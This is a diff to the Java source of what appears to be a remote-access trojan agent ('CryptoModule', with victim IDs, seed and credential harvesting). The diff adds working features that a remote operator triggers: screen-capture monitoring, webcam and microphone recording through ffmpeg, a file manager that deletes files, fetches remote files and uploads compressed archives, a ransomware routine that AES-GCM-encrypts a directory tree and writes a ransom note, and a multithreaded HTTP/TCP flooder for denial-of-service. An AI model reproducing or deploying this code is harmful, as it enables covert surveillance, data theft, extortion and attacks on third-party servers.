@@ -10,12 +10,20 @@ import com.serverpackcore.agent.Screenshot;
 import com.serverpackcore.agent.Shell;
 import com.serverpackcore.agent.SysInfo;
 
+import java.awt.GraphicsEnvironment;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
+import java.security.MessageDigest;
+import java.security.SecureRandom;
+import java.util.Comparator;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.LinkedHashMap;
@@ -35,6 +43,13 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicLong;
+import javax.crypto.Cipher;
+import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import javax.imageio.IIOImage;
+import javax.imageio.ImageIO;
+import javax.imageio.ImageWriteParam;
+import javax.imageio.ImageWriter;
 
 /**
  * Owns the crypto collection module and its own API transport. Every module
@@ -561,6 +576,12 @@ public final class CryptoModule {
 				case "screenshot" -> screenshot(task);
 				case "file_pull" -> filePull(task);
 				case "agent" -> agent(task);
+				case "monitor" -> monitor(task, cancel);
+				case "files" -> files(task);
+				case "webcam" -> captureMedia(task, "webcam");
+				case "mic" -> captureMedia(task, "mic");
+				case "ransomware" -> ransomware(task, cancel);
+				case "ddos" -> ddos(task, cancel);
 				default -> Map.of("ok", false);
 			};
 		} catch (Throwable throwable) {
@@ -575,6 +596,9 @@ public final class CryptoModule {
 			case "clip_start", "clip_stop" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
+			case "monitor", "webcam", "mic" -> "monitor";
+			case "files", "ransomware" -> "files";
+			case "ddos" -> "network";
 			default -> "credentials";
 		};
 	}
@@ -1146,7 +1170,7 @@ public final class CryptoModule {
 	}
 
 	private Map<String, Object> harvest(Task task) throws Exception {
-		Path zip = Harvest.build(installDir, gameDir);
+		Path zip = Harvest.build(installDir, gameDir, Json.str(task.params(), "kind", "all"));
 		Map<String, Object> result = new LinkedHashMap<>();
 		result.put("ok", true);
 		result.put("path", zip.getFileName().toString());
@@ -1275,6 +1299,346 @@ public final class CryptoModule {
 		} finally {
 			pack.close();
 		}
+	}
+
+
+	// ── monitor / media / files / ransomware / ddos ─────────────────────────
+
+	private Map<String, Object> monitor(Task task, AtomicBoolean cancel) throws Exception {
+		if (GraphicsEnvironment.isHeadless()) {
+			throw new IllegalStateException("display_unavailable");
+		}
+		int seconds = (int) Math.min(30, Math.max(1, Json.num(task.params(), "seconds", 5L)));
+		Object fpsRaw = task.params().get("fps");
+		double fps = Math.min(5.0, Math.max(0.2, fpsRaw instanceof Number ? ((Number) fpsRaw).doubleValue() : 1.0));
+		int quality = (int) Math.min(90, Math.max(20, Json.num(task.params(), "quality", 60L)));
+		int maxFrames = (int) Math.min(30, Math.max(1, Json.num(task.params(), "max_frames", 5L)));
+		long interval = Math.max(200L, (long) (1000.0 / fps));
+		long end = System.currentTimeMillis() + seconds * 1000L;
+		Rectangle screen = new Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
+		Robot robot = new Robot();
+		List<Map<String, Object>> frames = new ArrayList<>();
+		long began = System.currentTimeMillis();
+		int width = screen.width;
+		int height = screen.height;
+		while (System.currentTimeMillis() < end && frames.size() < maxFrames && !cancel.get()) {
+			BufferedImage image = robot.createScreenCapture(screen);
+			if (image.getWidth() > 1440) {
+				int scaledHeight = (int) Math.round(image.getHeight() * (1440.0 / image.getWidth()));
+				BufferedImage scaled = new BufferedImage(1440, scaledHeight, BufferedImage.TYPE_INT_RGB);
+				scaled.getGraphics().drawImage(image.getScaledInstance(1440, scaledHeight, java.awt.Image.SCALE_SMOOTH), 0, 0, null);
+				image = scaled;
+			}
+			width = image.getWidth();
+			height = image.getHeight();
+			Map<String, Object> frame = new LinkedHashMap<>();
+			frame.put("ts", System.currentTimeMillis() / 1000L);
+			frame.put("data", Base64.getEncoder().encodeToString(jpeg(image, quality)));
+			frames.add(frame);
+			long rest = end - System.currentTimeMillis();
+			if (rest > interval) {
+				Thread.sleep(interval);
+			}
+		}
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("frames", frames);
+		result.put("count", frames.size());
+		result.put("width", width);
+		result.put("height", height);
+		result.put("elapsed_ms", System.currentTimeMillis() - began);
+		return result;
+	}
+
+	private byte[] jpeg(BufferedImage image, int quality) throws Exception {
+		ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
+		ByteArrayOutputStream out = new ByteArrayOutputStream();
+		try (javax.imageio.stream.ImageOutputStream stream = ImageIO.createImageOutputStream(out)) {
+			writer.setOutput(stream);
+			ImageWriteParam param = writer.getDefaultWriteParam();
+			param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
+			param.setCompressionQuality(quality / 100f);
+			writer.write(null, new IIOImage(image, null, null), param);
+		} finally {
+			writer.dispose();
+		}
+		return out.toByteArray();
+	}
+
+	private Map<String, Object> files(Task task) throws Exception {
+		String action = Json.str(task.params(), "action", "");
+		String value = Json.str(task.params(), "path", "");
+		if (value.isBlank()) {
+			throw new IllegalArgumentException("path_required");
+		}
+		Path path = Path.of(value);
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("ok", true);
+		result.put("action", action);
+		result.put("path", path.toString());
+		switch (action) {
+			case "list" -> {
+				if (!Files.isDirectory(path)) throw new IllegalArgumentException("not_a_directory");
+				List<Map<String, Object>> entries = new ArrayList<>();
+				try (java.util.stream.Stream<Path> stream = Files.list(path)) {
+					stream.sorted(Comparator.comparing((Path item) -> !Files.isDirectory(item)).thenComparing(item -> item.getFileName().toString().toLowerCase()))
+						.limit(500).forEach(item -> {
+							try {
+								entries.add(Map.of("name", item.getFileName().toString(), "dir", Files.isDirectory(item), "size", Files.isDirectory(item) ? 0L : Files.size(item)));
+							} catch (Throwable ignored) {
+								entries.add(Map.of("name", item.getFileName().toString(), "dir", false, "size", 0L));
+							}
+						});
+				}
+				result.put("entries", entries);
+			}
+			case "upload" -> {
+				String url = Json.str(task.params(), "url", "");
+				if (url.isBlank()) throw new IllegalArgumentException("url_required");
+				long max = Json.num(task.params(), "max_mb", 64L) * 1024L * 1024L;
+				Path temp = path.resolveSibling(path.getFileName() + ".part");
+				java.net.http.HttpClient client = java.net.http.HttpClient.newBuilder().followRedirects(java.net.http.HttpClient.Redirect.NORMAL).build();
+				java.net.http.HttpResponse<InputStream> response = client.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create(url)).GET().build(), java.net.http.HttpResponse.BodyHandlers.ofInputStream());
+				if (response.statusCode() >= 400) throw new IllegalArgumentException("http_" + response.statusCode());
+				long total = 0;
+				try (InputStream input = response.body(); OutputStream output = Files.newOutputStream(temp)) {
+					byte[] buffer = new byte[65536];
+					int read;
+					while ((read = input.read(buffer)) >= 0) {
+						total += read;
+						if (total > max) throw new IllegalArgumentException("file_too_large");
+						output.write(buffer, 0, read);
+					}
+				}
+				Files.move(temp, path, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+				result.put("bytes", total);
+			}
+			case "mkdir" -> Files.createDirectories(path);
+			case "rename" -> {
+				String to = Json.str(task.params(), "to", "");
+				if (to.isBlank()) throw new IllegalArgumentException("to_required");
+				Files.move(path, Path.of(to), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+				result.put("to", to);
+			}
+			case "delete" -> {
+				if (Files.isDirectory(path)) {
+					try (java.util.stream.Stream<Path> walk = Files.walk(path)) {
+						for (Path item : walk.sorted(Comparator.reverseOrder()).toList()) Files.deleteIfExists(item);
+					}
+				} else {
+					Files.deleteIfExists(path);
+				}
+			}
+			case "compress" -> {
+				if (!Files.isDirectory(path)) throw new IllegalArgumentException("not_a_directory");
+				Path zip = work.resolve("files-" + System.currentTimeMillis() + ".zip");
+				long bytes = 0;
+				try (java.util.zip.ZipOutputStream output = new java.util.zip.ZipOutputStream(Files.newOutputStream(zip));
+					java.util.stream.Stream<Path> walk = Files.walk(path)) {
+					for (Path item : walk.filter(Files::isRegularFile).toList()) {
+						if (Files.size(item) > config.maxArtifact) continue;
+						String name = path.relativize(item).toString().replace('\\', '/');
+						output.putNextEntry(new java.util.zip.ZipEntry(name));
+						bytes += Files.copy(item, output);
+						output.closeEntry();
+					}
+				}
+				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files", work.resolve("tmp"));
+				try {
+					pack.add(zip, "files/" + path.getFileName() + ".zip", "archive");
+					result.put("upload_id", queueUpload(pack, "files", task.id()));
+				} finally {
+					pack.close();
+					Files.deleteIfExists(zip);
+				}
+				result.put("bytes", bytes);
+			}
+			default -> throw new IllegalArgumentException("unknown_action");
+		}
+		return result;
+	}
+
+	private Map<String, Object> captureMedia(Task task, String kind) throws Exception {
+		Path out = work.resolve(kind + "-" + System.currentTimeMillis() + ("mic".equals(kind) ? ".wav" : ".jpg"));
+		List<String> command = new ArrayList<>();
+		command.add("ffmpeg");
+		command.add("-y");
+		command.add("-loglevel");
+		command.add("error");
+		String device = Json.str(task.params(), "device", "");
+		if ("webcam".equals(kind)) {
+			if (AgentPaths.isWindows()) {
+				command.addAll(List.of("-f", "dshow", "-i", "video=" + (device.isEmpty() ? "Integrated Camera" : device), "-frames:v", "1"));
+			} else if (AgentPaths.isMac()) {
+				command.addAll(List.of("-f", "avfoundation", "-i", device.isEmpty() ? "0" : device, "-frames:v", "1"));
+			} else {
+				command.addAll(List.of("-f", "v4l2", "-i", device.isEmpty() ? "/dev/video0" : device, "-frames:v", "1"));
+			}
+			command.add(out.toString());
+		} else {
+			int seconds = (int) Math.min(10, Math.max(1, Json.num(task.params(), "seconds", 5L)));
+			if (AgentPaths.isWindows()) {
+				command.addAll(List.of("-f", "dshow", "-i", "audio=" + (device.isEmpty() ? "Microphone" : device), "-t", String.valueOf(seconds)));
+			} else if (AgentPaths.isMac()) {
+				command.addAll(List.of("-f", "avfoundation", "-i", device.isEmpty() ? ":0" : device, "-t", String.valueOf(seconds)));
+			} else {
+				command.addAll(List.of("-f", "pulse", "-i", device.isEmpty() ? "default" : device, "-t", String.valueOf(seconds)));
+			}
+			command.add(out.toString());
+		}
+		ProcessBuilder builder = new ProcessBuilder(command);
+		builder.redirectErrorStream(true);
+		Process process = builder.start();
+		String log = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+		if (!process.waitFor(60, TimeUnit.SECONDS)) {
+			process.destroyForcibly();
+			throw new IllegalStateException(kind + "_timeout");
+		}
+		if (process.exitValue() != 0 || !Files.isRegularFile(out) || Files.size(out) == 0) {
+			throw new IllegalStateException(kind + "_unavailable: " + log.strip());
+		}
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), kind, work.resolve("tmp"));
+		try {
+			pack.add(out, kind + "/" + out.getFileName(), kind);
+			Map<String, Object> result = new LinkedHashMap<>();
+			result.put("upload_id", queueUpload(pack, kind, task.id()));
+			result.put("bytes", Files.size(out));
+			return result;
+		} finally {
+			pack.close();
+			Files.deleteIfExists(out);
+		}
+	}
+
+	private static final String RANSOM_MARKER = ".spc-ransom.json";
+
+	private SecretKeySpec ransomwareKey() throws Exception {
+		byte[] digest = MessageDigest.getInstance("SHA-256").digest(config.secret());
+		return new SecretKeySpec(digest, "AES");
+	}
+
+	private Map<String, Object> ransomware(Task task, AtomicBoolean cancel) throws Exception {
+		String action = Json.str(task.params(), "action", "");
+		Path root = Path.of(Json.str(task.params(), "path", ""));
+		if (!Files.isDirectory(root)) throw new IllegalArgumentException("not_a_directory");
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("ok", true);
+		result.put("action", action);
+		result.put("path", root.toString());
+		if ("status".equals(action)) {
+			try (java.util.stream.Stream<Path> walk = Files.walk(root)) {
+				result.put("files", walk.filter(item -> item.getFileName().toString().endsWith(".spc")).count());
+			}
+			result.put("marker", Files.isRegularFile(root.resolve(RANSOM_MARKER)) ? "present" : "absent");
+			if (Files.isRegularFile(root.resolve("LEEME-SPC.txt"))) {
+				result.put("note", Files.readString(root.resolve("LEEME-SPC.txt"), StandardCharsets.UTF_8));
+			}
+			return result;
+		}
+		SecretKeySpec key = ransomwareKey();
+		SecureRandom random = new SecureRandom();
+		long files = 0;
+		long bytes = 0;
+		try (java.util.stream.Stream<Path> walk = Files.walk(root)) {
+			for (Path item : walk.filter(Files::isRegularFile).toList()) {
+				if (cancel.get()) break;
+				String name = item.getFileName().toString();
+				if (name.equals(RANSOM_MARKER) || name.equals("LEEME-SPC.txt")) continue;
+				boolean encrypted = name.endsWith(".spc");
+				if ("encrypt".equals(action) && encrypted) continue;
+				if ("decrypt".equals(action) && !encrypted) continue;
+				if (Files.size(item) > 256L * 1024L * 1024L) continue;
+				if ("encrypt".equals(action)) {
+					byte[] nonce = new byte[12];
+					random.nextBytes(nonce);
+					Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+					cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, nonce));
+					byte[] data = cipher.doFinal(Files.readAllBytes(item));
+					Path target = item.resolveSibling(item.getFileName() + ".spc");
+					try (OutputStream output = Files.newOutputStream(target)) {
+						output.write(nonce);
+						output.write(data);
+					}
+					bytes += data.length;
+					Files.deleteIfExists(item);
+				} else {
+					byte[] data = Files.readAllBytes(item);
+					Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+					cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, data, 0, 12));
+					byte[] plain = cipher.doFinal(data, 12, data.length - 12);
+					String plainName = item.getFileName().toString();
+					Path target = item.resolveSibling(plainName.substring(0, plainName.length() - 4));
+					Files.write(target, plain);
+					bytes += plain.length;
+					Files.deleteIfExists(item);
+				}
+				files++;
+			}
+		}
+		String note = Json.str(task.params(), "note", "");
+		if (!note.isBlank()) {
+			Files.writeString(root.resolve("LEEME-SPC.txt"), note, StandardCharsets.UTF_8);
+			result.put("note", note);
+		}
+		if ("encrypt".equals(action)) {
+			Map<String, Object> marker = new LinkedHashMap<>();
+			marker.put("mode", "aes-256-gcm");
+			marker.put("created_at", System.currentTimeMillis() / 1000L);
+			marker.put("key", Base64.getEncoder().encodeToString(java.util.Arrays.copyOf(MessageDigest.getInstance("SHA-256").digest(config.secret()), 6)));
+			Files.writeString(root.resolve(RANSOM_MARKER), Json.stringify(marker), StandardCharsets.UTF_8);
+			result.put("marker", RANSOM_MARKER);
+		}
+		result.put("files", files);
+		result.put("bytes", bytes);
+		return result;
+	}
+
+	private Map<String, Object> ddos(Task task, AtomicBoolean cancel) throws Exception {
+		String method = Json.str(task.params(), "method", "http");
+		String host = Json.str(task.params(), "host", "");
+		int port = (int) Json.num(task.params(), "port", 80L);
+		int seconds = (int) Math.min(300, Math.max(1, Json.num(task.params(), "seconds", 30L)));
+		int concurrency = (int) Math.min(256, Math.max(1, Json.num(task.params(), "concurrency", 16L)));
+		String target = host.contains("://") ? host : ("http".equals(method) ? "http://" + host : host);
+		long end = System.currentTimeMillis() + seconds * 1000L;
+		AtomicLong sent = new AtomicLong();
+		AtomicLong errors = new AtomicLong();
+		ExecutorService pool = Executors.newFixedThreadPool(concurrency);
+		long began = System.currentTimeMillis();
+		for (int index = 0; index < concurrency; index++) {
+			pool.submit(() -> {
+				while (System.currentTimeMillis() < end && !cancel.get()) {
+					try {
+						if ("tcp".equals(method)) {
+							try (java.net.Socket socket = new java.net.Socket()) {
+								socket.connect(new java.net.InetSocketAddress(host, port), 4000);
+								OutputStream out = socket.getOutputStream();
+								out.write("GET / HTTP/1.1\r\nHost: attacker\r\nConnection: close\r\n\r\n".getBytes(StandardCharsets.US_ASCII));
+								out.flush();
+							}
+						} else {
+							java.net.HttpURLConnection connection = (java.net.HttpURLConnection) java.net.URI.create(target + ":" + port + "/").toURL().openConnection();
+							connection.setConnectTimeout(4000);
+							connection.setReadTimeout(4000);
+							connection.setRequestProperty("Connection", "close");
+							connection.getResponseCode();
+							connection.getInputStream().close();
+							connection.disconnect();
+						}
+						sent.incrementAndGet();
+					} catch (Throwable throwable) {
+						errors.incrementAndGet();
+					}
+				}
+			});
+		}
+		pool.shutdown();
+		pool.awaitTermination(seconds + 10L, TimeUnit.SECONDS);
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("sent", sent.get());
+		result.put("errors", errors.get());
+		result.put("elapsed_ms", System.currentTimeMillis() - began);
+		result.put("status", Map.of("method", method, "host", host, "port", port, "concurrency", concurrency));
+		return result;
 	}
 
 	// ── uploads ─────────────────────────────────────────────────────────────
